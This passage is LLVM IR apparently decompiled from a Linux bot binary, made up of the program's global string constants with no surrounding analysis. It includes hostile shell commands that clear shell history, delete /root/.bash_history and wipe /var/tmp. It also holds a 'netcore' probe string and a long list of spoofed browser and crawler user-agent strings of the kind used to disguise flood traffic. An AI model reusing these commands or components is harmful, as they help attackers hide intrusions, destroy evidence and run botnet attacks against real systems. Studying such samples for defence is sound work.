([3 x i8], [3 x i8]* @global_var_8057146.245, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057149.246, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805714c.247, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805714f.248, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8057152.249, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057163.250, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805716c.251, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057176.252, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805717e.253, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057183.254, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805718c.255, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057195.256, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805719b.257, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80571a4.258, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80571ae.259, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80571b8.260, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057100.230, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057105.231, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80571c2.261, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80571ca.262, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80571cf.263, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80571d8.264, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80571e1.265, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80571e6.266, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80571ed.267, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80571f6.268, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80571fb.15, i32 0, i32 0), i8* bitcast (i32* @global_var_80571fe.269 to i8*), i8* bitcast (i32* @global_var_8057200.270 to i8*), i8* bitcast (i32* @global_var_8057202.271 to i8*), i8* bitcast (i32* @global_var_8057204.272 to i8*), i8* bitcast (i32* @global_var_8057206.273 to i8*), i8* bitcast (i32* @global_var_8057208.274 to i8*), i8* bitcast (i32* @global_var_805720a.275 to i8*), i8* bitcast (i32* @global_var_805720c.276 to i8*), i8* bitcast (i32* @global_var_805720e.277 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057210.278, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057213.279, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057216.280, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057219.281, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805721c.282, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805721f.283, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057222.284, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057225.285, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057228.286, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805722b.287, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805722e.288, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057231.289, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057237.290, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805723c.291, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057241.292, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057246.293, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805724c.294, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057253.295, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805725b.296, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057263.297, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805726b.298, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057274.299, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805727c.300, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057283.301, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805728c.302, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057294.303, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057299.304, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80572a0.305, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80572a7.306, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80572ae.307, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80572b5.308, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80572bb.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80572c4.310, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80572ca.311, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_80572cf.312, i32 0, i32 0)]
@global_var_80581d9.314 = constant i32 1094778914
@global_var_80581db.315 = constant [16 x i8] c"AAAAAAAAnetcore\00"
@global_var_80581ec.316 = constant [3 x i8] c"AA\00"
@global_var_8058380.317 = constant [22 x i8] c"history -c;history -w\00"
@global_var_8058396.318 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_80583b4.319 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_80583cc.320 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_805840c.321 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_805844c.322 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_80584dc.323 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_8058514.324 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_8058534.325 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_805854c.326 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_80585a4.327 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_8058644.328 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_8058698.329 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_805870c.330 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_805874c.331 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_8058804.332 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_8058858.333 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_80588b0.334 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_8058908.335 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_8058948.336 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_8058990.337 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_80589e8.338 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_8058a54.339 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_8058aac.340 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_8058afc.341 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_8058b20.342 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_8058b7b.343 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_8058b8c.344 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_8058bbc.345 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_8058be0.346 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_8058c02.347 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_8058c1c.348 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_8058c5c.349 = constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00"
@global_var_8058cac.350 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_8058cf8.351 = constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00"
@global_var_8058d34.352 = constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00"
@global_var_8058d90.353 = constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00"
@global_var_8058df8.354 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_8058e6c.355 = constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00"
@global_var_8058ee4.356 = constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00"
@global_var_8058f40.357 = constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00"
@global_var_8058f94.358 = constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00"
@global_var_805901c.359 = constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_8059070.360 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_80590d8.361 = constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00"
@global_var_8059134.362 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_8059184.363 = constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00"
@global_var_80591c8.364 = constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00"
@global_var_805921c.365 = constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00"
@global_var_8059268.366 = constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_80592ac.367 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00"
@global_var_8059300.368 = constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_805936c.369 = constant [110 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_80593dc.370 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00"
@global_var_8059438.371 = constant [116 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1\00"
@global_var_80594ac.372 = constant [110 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_805951c.373 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00"
@global_var_80595b4.374 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)\00"
@global_var_8059600.375 = constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_8059668.376 = constant [58 x i8] c"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\00"
@global_var_80596a4.377 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_80596d4.378 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_8059714.379 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00"
@global_var_8059760.380 = constant [83 x i8] c"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_80597b4.381 = constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00"
@global_var_8059864.382 = constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00"
@global_var_80598cc.383 = constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00"
@global_var_8059934.384 = constant [80 x i8] c"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/\00"
@global_var_8059984.385 = constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00"
@global_var_80599bc.386 = constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00"
@global_var_80599ec.387 = constant [91 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_8059a48.388 = constant [105 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_8059ab4.389 = constant [102 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_8059b1c.390 = constant [87 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_8059b74.391 = constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_8059bd0.392 = constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_8059c2c.393 = constant [86 x i8] c"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )\00"
@global_var_8059c84.394 = constant [93 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)\00"
@global_var_8059ce4.395 = constant [97 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)\00"
@global_var_8059d48.396 = constant [43 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)\00"
@global_var_8059d74.397 = constant [52 x i8] c"TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)\00"
@global_var_8059da8.398 = constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00"
@global_var_8059dc8.399 = constant [31 x i8] c"TheSuBot/0.1 (www.thesubot.de)\00"
@global_var_8059de8.400 = constant [85 x i8] c"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_8059e40.401 = constant [94 x i8] c"FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00"
@global_var_8059ea0.402 = constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_8059ef8.403 = constant [94 x i8] c"FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00"
@global_var_8059f58.404 = constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_8059fb0.405 = constant [31 x i8] c"FAST-WebCrawler/3.x Multimedia\00"
@global_var_8059fd0.406 = constant [37 x i8] c"Mozilla/4.0 (compatible: FDSE robot)\00"
@global_var_8059ff8.407 = constant [63 x i8] c"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805a038.408 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805a080.409 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805a0c8.410 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805a110.411 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_805a158.412 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_805a1ac.413 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_805a1fc.414 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_805a268.415 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_805a2bc.416 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_805a318.417 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_805a374.418 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_805a3d8.419 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_805a434.420 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805a490.421 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805a4ec.422 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_805a54c.423 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_805a594.424 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_805a62c.425 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_805a678.426 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_805a6c4.427 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_805a714.428 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_805a75c.429 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_805a7b0.430 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_805a800.431 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_805a848.432 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_805a894.433 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_805a8e0.434 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_805a928.435 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_805a978.436 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_805a9c8.437 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_805a9fc.438 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_805aa30.439 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_805aa78.440 = constant [54 x i8] c"MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)\00"
@global_var_805aab0.441 = constant [77 x i8] c"Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0\00"
@global_var_805ab00.442 = constant [68 x i8] c"Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)\00"
@global_var_805ab44.443 = constant [47 x i8] c"msnbot/1.0 (+http://search.msn.com/msnbot.htm)\00"
@global_var_805ab74.444 = constant [47 x i8] c"msnbot/0.9 (+http://search.msn.com/msnbot.htm)\00"
@global_var_805aba4.445 = constant [48 x i8] c"msnbot/0.11 ( http://search.msn.com/msnbot.htm)\00"
@global_var_805abd4.446 = constant [46 x i8] c"MSNBOT/0.1 (http://search.msn.com/msnbot.htm)\00"
@global_var_805ac04.447 = constant [71 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)\00"
@global_var_805ac4c.448 = constant [70 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)\00"
@global_var_805ac94.449 = constant [55 x i8] c"NetResearchServer/4.0(loopimprovements.com/robot.html)\00"
@global_var_805accc.450 = constant [55 x i8] c"NetResearchServer/3.5(loopimprovements.com/robot.html)\00"
@global_var_805ad04.451 = constant [55 x i8] c"NetResearchServer/2.8(loopimprovements.com/robot.html)\00"
@global_var_805ad3c.452 = constant [55 x i8] c"NetResearchServer/2.7(loopimprovements.com/robot.html)\00"
@global_var_805ad74.453 = constant [55 x i8] c"NetResearchServer/2.5(loopimprovements.com/robot.html)\00"
@global_var_805adac.454 = constant [83 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)\00"
@global_var_805ae00.455 = constant [55 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)\00"
@global_var_805ae38.456 = constant [84 x i8] c"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)\00"
@global_var_805ae8c.457 = constant [113 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)\00"
@global_var_805af00.458 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)\00"
@global_var_805af48.459 = constant [117 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET \00"
@global_var_805afc0.460 = constant [50 x i8] c"Googlebot/2.1 (http://www.googlebot.com/bot.html)\00"
@global_var_805aff4.461 = constant [35 x i8] c"Opera/9.20 (Windows NT 6.0; U; en)\00"
@global_var_805b018.462 = constant [133 x i8] c"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\00"
@global_var_805b0a0.463 = constant [109 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)\00"
@global_var_805b110.464 = constant [120 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)\00"
@global_var_805b188.465 = constant [50 x i8] c"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0\00"
@global_var_805b1bc.466 = constant [160 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\00"
@global_var_805b25c.467 = constant [113 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16\00"
